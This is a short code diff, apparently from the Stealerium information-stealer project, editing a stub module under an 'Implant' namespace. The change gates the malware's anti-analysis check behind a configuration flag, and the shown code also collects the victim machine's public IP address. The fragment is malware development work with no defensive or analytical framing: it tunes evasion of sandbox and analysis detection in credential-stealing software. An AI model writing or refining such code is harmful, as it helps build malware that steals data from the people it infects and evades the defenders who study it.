@@ -1,4 +1,4 @@
-﻿using System;
+using System;
 using System.IO;
 using Stealerium.Stub.Helpers;
 using Stealerium.Stub.Modules.Implant;
@@ -15,8 +15,8 @@ namespace Stealerium.Stub.Target.System
         {
             try
             {
-                // Fetch hosting status synchronously
-                bool hostingStatus = AntiAnalysis.Run();
+                // Fetch hosting status synchronously only if anti-analysis is enabled
+                bool hostingStatus = Config.AntiAnalysis == "1" ? AntiAnalysis.Run() : false;
 
                 // Fetch external IP synchronously
                 string externalIp = SystemInfo.GetPublicIpAsync().GetAwaiter().GetResult();
